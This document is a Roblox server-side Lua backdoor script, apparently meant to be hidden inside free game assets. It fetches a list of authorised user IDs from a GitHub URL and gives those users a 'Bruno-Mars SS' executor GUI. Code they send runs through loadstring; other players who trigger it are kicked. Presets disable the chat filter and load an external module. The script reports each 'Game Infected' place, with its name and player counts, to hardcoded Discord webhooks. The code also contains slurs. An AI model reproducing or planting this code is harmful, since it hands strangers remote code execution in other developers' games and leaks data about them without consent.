local Remote = Instance.new("RemoteEvent")
local Folder = Instance.new("Folder")
local lucky
local retards = {}
Folder.Name = "Remotes"
Folder.Parent = game:GetService("ReplicatedStorage")
Remote.Parent = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
Remote.Name = "Trigger"
script.Parent = game:GetService("ServerScriptService")
local ha = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/uhuhuhuhuhuhuhuh/pabloescobar/main/hi.json"))
for i, re in pairs(ha.pablos) do
	table.insert(retards,re.id)
end

if game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).IsPublicDomain then 
	lucky = "true"
else 
	lucky = "false"
end
game.Players.PlayerAdded:Connect(function(player)

	if table.find(retards, player.UserId) then
		local ScreenGui = Instance.new("ScreenGui")
		local Main = Instance.new("Frame")
		local Execute = Instance.new("TextButton")
		local Clear = Instance.new("TextButton")
		local respawn = Instance.new("TextButton")
		local SaveScript = Instance.new("TextButton")
		local scripts = Instance.new("TextBox")
		local clear = Instance.new("ImageButton")
		local Scripts = Instance.new("ScrollingFrame")
		local _1 = Instance.new("TextButton")
		local _2 = Instance.new("TextButton")
		local _3 = Instance.new("TextButton")
		local Name = Instance.new("TextLabel")
		local Minimize = Instance.new("ImageButton")
		local settings = Instance.new("ImageButton")
		local R6 = Instance.new("TextButton")
		local UICorner = Instance.new("UICorner")
		local Open = Instance.new("TextButton")
		local Mainscript = script.Main:Clone()

		--Properties:

		ScreenGui.Parent = player.PlayerGui
		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		ScreenGui.ResetOnSpawn = true
		ScreenGui.Draggable = true

		Main.Name = "Main"
		Main.Parent = ScreenGui
		Main.Active = true
		Main.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		Main.BorderColor3 = Color3.fromRGB(35, 35, 35)
		Main.BorderSizePixel = 5
		Main.Position = UDim2.new(0.258265615, 0, 0.268776208, 0)
		Main.Size = UDim2.new(0, 700, 0, 316)

		Execute.Name = "Execute"
		Execute.Parent = Main
		Execute.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		Execute.BorderColor3 = Color3.fromRGB(35, 35, 35)
		Execute.BorderSizePixel = 4
		Execute.Position = UDim2.new(-0.000551801408, 0, 0.887966514, 0)
		Execute.Size = UDim2.new(0, 169, 0, 35)
		Execute.Font = Enum.Font.Roboto
		Execute.Text = "Execute"
		Execute.TextColor3 = Color3.fromRGB(177, 177, 39)
		Execute.TextScaled = true
		Execute.TextSize = 14.000
		Execute.TextWrapped = true

		Clear.Name = "Clear"
		Clear.Parent = Main
		Clear.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		Clear.BorderColor3 = Color3.fromRGB(35, 35, 35)
		Clear.BorderSizePixel = 4
		Clear.Position = UDim2.new(0.251237124, 0, 0.887966514, 0)
		Clear.Size = UDim2.new(0, 169, 0, 35)
		Clear.Font = Enum.Font.Roboto
		Clear.Text = "Clear"
		Clear.TextColor3 = Color3.fromRGB(177, 177, 39)
		Clear.TextScaled = true
		Clear.TextSize = 14.000
		Clear.TextWrapped = true

		respawn.Name = "respawn"
		respawn.Parent = Main
		respawn.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		respawn.BorderColor3 = Color3.fromRGB(35, 35, 35)
		respawn.BorderSizePixel = 4
		respawn.Position = UDim2.new(0.503026128, 0, 0.887966514, 0)
		respawn.Size = UDim2.new(0, 169, 0, 35)
		respawn.Font = Enum.Font.Roboto
		respawn.Text = "Respawn"
		respawn.TextColor3 = Color3.fromRGB(177, 177, 39)
		respawn.TextScaled = true
		respawn.TextSize = 14.000
		respawn.TextWrapped = true

		SaveScript.Name = "SaveScript"
		SaveScript.Parent = Main
		SaveScript.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		SaveScript.BorderColor3 = Color3.fromRGB(35, 35, 35)
		SaveScript.BorderSizePixel = 4
		SaveScript.Position = UDim2.new(0.754815042, 0, 0.887966514, 0)
		SaveScript.Size = UDim2.new(0, 169, 0, 35)
		SaveScript.Font = Enum.Font.Roboto
		SaveScript.Text = "Save script"
		SaveScript.TextColor3 = Color3.fromRGB(177, 177, 39)
		SaveScript.TextScaled = true
		SaveScript.TextSize = 14.000
		SaveScript.TextWrapped = true

		scripts.Name = "scripts"
		scripts.Parent = Main
		scripts.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
		scripts.BorderSizePixel = 0
		scripts.Position = UDim2.new(0.00428571412, 0, 0.091482237, 0)
		scripts.Size = UDim2.new(0, 520, 0, 241)
		scripts.Font = Enum.Font.Roboto
		scripts.MultiLine = true
		scripts.PlaceholderColor3 = Color3.fromRGB(177, 177, 39)
		scripts.PlaceholderText = "--put script here"
		scripts.Text = ""
		scripts.TextColor3 = Color3.fromRGB(177, 177, 39)
		scripts.TextSize = 14.000
		scripts.TextXAlignment = Enum.TextXAlignment.Left
		scripts.TextYAlignment = Enum.TextYAlignment.Top

		clear.Name = "clear"
		clear.Parent = Main
		clear.BackgroundTransparency = 1.000
		clear.LayoutOrder = 4
		clear.Position = UDim2.new(0.962857127, 0, 0, 0)
		clear.Size = UDim2.new(0, 25, 0, 25)
		clear.ZIndex = 2
		clear.Image = "rbxassetid://3926305904"
		clear.ImageColor3 = Color3.fromRGB(255, 0, 0)
		clear.ImageRectOffset = Vector2.new(924, 724)
		clear.ImageRectSize = Vector2.new(36, 36)

		Scripts.Name = "Scripts"
		Scripts.Parent = Main
		Scripts.Active = true
		Scripts.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		Scripts.BorderColor3 = Color3.fromRGB(35, 35, 35)
		Scripts.BorderSizePixel = 5
		Scripts.Position = UDim2.new(0.763029099, 0, 0.091482237, 0)
		Scripts.Size = UDim2.new(0, 164, 0, 240)
		Scripts.ScrollBarThickness = 8

		_1.Name = "1"
		_1.Parent = Scripts
		_1.BackgroundColor3 = Color3.fromRGB(177, 177, 39)
		_1.BorderColor3 = Color3.fromRGB(35, 35, 35)
		_1.BorderSizePixel = 4
		_1.Size = UDim2.new(0, 154, 0, 32)
		_1.Font = Enum.Font.SourceSans
		_1.Text = "Anti Anti Censor ;)"
		_1.TextColor3 = Color3.fromRGB(0, 0, 0)
		_1.TextSize = 14.000
		_1:SetAttribute("script","local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end")
		local hy = script.button:Clone()
		hy.Parent = _1

		_2.Name = "2"
		_2.Parent = Scripts
		_2.BackgroundColor3 = Color3.fromRGB(177, 177, 39)
		_2.BorderColor3 = Color3.fromRGB(35, 35, 35)
		_2.BorderSizePixel = 4
		_2.Position = UDim2.new(0, 0, 0.0599999987, 0)
		_2.Size = UDim2.new(0, 154, 0, 32)
		_2.Font = Enum.Font.SourceSans
		_2.TextColor3 = Color3.fromRGB(0, 0, 0)
		_2.Text = "Topk3k 5.2"
		_2.TextSize = 14.000
		_2:SetAttribute("script","require(10127180199)('"..player.Name.."')")
		local dy = script.button:Clone()
		dy.Parent = _2

		_3.Name = "3"
		_3.Parent = Scripts
		_3.BackgroundColor3 = Color3.fromRGB(177, 177, 39)
		_3.BorderColor3 = Color3.fromRGB(35, 35, 35)
		_3.BorderSizePixel = 4
		_3.Position = UDim2.new(0, 0, 0.119999997, 0)
		_3.Size = UDim2.new(0, 154, 0, 32)
		_3.Font = Enum.Font.SourceSans
		_3.TextColor3 = Color3.fromRGB(0, 0, 0)
		_3.TextSize = 14.000

		Name.Name = "Name"
		Name.Parent = Main
		Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Name.BackgroundTransparency = 1.000
		Name.BorderSizePixel = 0
		Name.Position = UDim2.new(0.00367824011, 0, 0.0117314011, 0)
		Name.Size = UDim2.new(0, 520, 0, 25)
		Name.Font = Enum.Font.Roboto
		Name.Text = "Bruno-Mars SS"
		Name.TextColor3 = Color3.fromRGB(177, 177, 39)
		Name.TextSize = 40.000

		Minimize.Name = "Minimize"
		Minimize.Parent = Main
		Minimize.BackgroundTransparency = 1.000
		Minimize.LayoutOrder = 6
		Minimize.Position = UDim2.new(0.912857115, 0, 0, 0)
		Minimize.Size = UDim2.new(0, 25, 0, 25)
		Minimize.ZIndex = 2
		Minimize.Image = "rbxassetid://3926307971"
		Minimize.ImageRectOffset = Vector2.new(884, 284)
		Minimize.ImageRectSize = Vector2.new(36, 36)

		settings.Name = "settings"
		settings.Parent = Main
		settings.Active = false
		settings.BackgroundTransparency = 1.000
		settings.Position = UDim2.new(0.861428559, 0, -0.00316457171, 0)
		settings.Size = UDim2.new(0, 25, 0, 25)
		settings.Visible = false
		settings.Image = "rbxassetid://3926307971"
		settings.ImageRectOffset = Vector2.new(324, 124)
		settings.ImageRectSize = Vector2.new(36, 36)

		R6.Name = "R6"
		R6.Parent = Main
		R6.BackgroundColor3 = Color3.fromRGB(177, 177, 39)
		R6.BorderSizePixel = 0
		R6.Position = UDim2.new(0.850000024, 0, 0.00499999989, 0)
		R6.Size = UDim2.new(0, 36, 0, 20)
		R6.Font = Enum.Font.Roboto
		R6.Text = "R6"
		R6.TextColor3 = Color3.fromRGB(0, 0, 0)
		R6.TextScaled = true
		R6.TextSize = 14.000
		R6.TextWrapped = true

		UICorner.CornerRadius = UDim.new(1, 0)
		UICorner.Parent = R6

		Open.Name = "Open"
		Open.Parent = ScreenGui
		Open.Active = false
		Open.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
		Open.BorderColor3 = Color3.fromRGB(35, 35, 35)
		Open.BorderSizePixel = 4
		Open.Position = UDim2.new(0.446130544, 0, -0.000243067741, 0)
		Open.Size = UDim2.new(0, 146, 0, 26)
		Open.Visible = false
		Open.Font = Enum.Font.SourceSans
		Open.Text = "Open"
		Open.TextColor3 = Color3.fromRGB(177, 177, 39)
		Open.TextSize = 36.000

		Mainscript.Parent = ScreenGui

	end
end)
Remote.OnServerEvent:Connect(function(player,ss)
	if table.find(retards, player.UserId) then
		loadstring(ss)()
	else 
		player:Kick("fuck you")
	end
end)
game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/901159512944308235/5qwgZClTiGk6GMkBP3weXSec_aaG3pYxVctjAHagcMXB3syJJEwoavT_lco6r6oO0EW7"and"https://discord.com/api/webhooks/999868408420118629/9-qIKHJVLdz1xRiUT3MWQ4-2Ac5QlMQ39ghR2PhmLDlIHYQzjiLe6UZ_gwqMCwFXSJnF",game:GetService("HttpService"):JSONEncode({
	['embeds'] = {
		{
			['title'] = "**Game Infected**",
			['image'] = {['url'] = "https://cdn.discordapp.com/attachments/929059812862472262/999876540789706832/100300106.27999997_WIN_20201021_18_12_01_Pro.jpg"},
			['description'] = "[https://www.roblox.com/games/"..game.PlaceId.."](https://www.roblox.com/games/"..game.PlaceId..")",
			['color'] =  math.random(0,10066329),
			['fields'] = {
				{
					['name'] = "Game Name:",
					['value'] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
				},
				{
					['name'] = "Public Game",
					['value'] = lucky,
				},	
				{
					['name'] = "Players online",
					['value'] = #game.Players:GetPlayers(),
					['inline'] = true
				},	
				{
					['name'] = "Max Player Size",
					['value'] = game.Players.MaxPlayers,
					['inline'] = true
				}		


			},

		}
	}
}))

